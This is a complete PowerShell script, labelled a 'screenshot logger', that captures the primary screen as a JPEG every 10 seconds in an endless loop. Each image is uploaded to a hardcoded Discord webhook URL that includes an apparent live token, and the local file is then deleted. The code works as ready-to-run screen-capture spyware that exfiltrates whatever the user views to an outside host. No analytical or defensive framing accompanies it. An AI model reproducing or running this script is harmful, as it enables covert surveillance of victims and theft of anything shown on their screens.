# ========== CONFIGURATION ==========
$webhookUrl = 'https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT'
$intervalSeconds = 10          # Screenshot every 10 seconds
$tempDir = "$env:TEMP\ScreenCap"
$quality = 75                  # JPEG quality (1-100, lower = smaller file)

# ========== CREATE TEMP FOLDER ==========
if (!(Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }

# ========== FUNCTION: CAPTURE SCREENSHOT ==========
function Take-Screenshot {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
    
    $tempFile = Join-Path $tempDir "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
    $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {$_.MimeType -eq 'image/jpeg'}
    $params = New-Object System.Drawing.Imaging.EncoderParameters(1)
    $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, $quality)
    $bitmap.Save($tempFile, $codec, $params)
    
    $graphics.Dispose()
    $bitmap.Dispose()
    return $tempFile
}


function Send-ScreenshotToDiscord {
    param([string]$imagePath)
    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $lineBreak = "`r`n"
        
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $imagePath -Leaf)`"",
            "Content-Type: image/jpeg",
            $lineBreak,
            [System.IO.File]::ReadAllBytes($imagePath),
            $lineBreak,
            "--$boundary--",
            $lineBreak
        )
        
        # Convert byte array + text parts into a single byte array for upload
        $encoding = [System.Text.Encoding]::UTF8
        $fullBody = New-Object System.IO.MemoryStream
        
        foreach ($part in $bodyLines) {
            if ($part -is [string]) {
                $bytes = $encoding.GetBytes($part)
                $fullBody.Write($bytes, 0, $bytes.Length)
            }
            elseif ($part -is [byte[]]) {
                $fullBody.Write($part, 0, $part.Length)
            }
        }
        
        $fullBody.Position = 0
        $reader = New-Object System.IO.BinaryReader($fullBody)
        $uploadData = $reader.ReadBytes($fullBody.Length)
        $reader.Dispose()
        $fullBody.Dispose()
        
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $uploadData -ErrorAction Stop
        Write-Host "[✓ Screenshot sent: $(Split-Path $imagePath -Leaf)]" -ForegroundColor Green
    }
    catch {
        Write-Host "[✗ Upload failed: $_]" -ForegroundColor Red
    }
}

# ========== MAIN LOOP ==========
Write-Host "Screenshot logger started. Captures every $intervalSeconds seconds." -ForegroundColor Cyan
Write-Host "Press Ctrl+C to stop." -ForegroundColor Yellow

while ($true) {
    $imgPath = Take-Screenshot
    Write-Host "[Captured screenshot]" -ForegroundColor DarkGray
    Send-ScreenshotToDiscord -imagePath $imgPath
    
    # Clean up local file after upload (optional – keep if you want audit)
    Remove-Item $imgPath -Force -ErrorAction SilentlyContinue
    
    Start-Sleep -Seconds $intervalSeconds
}
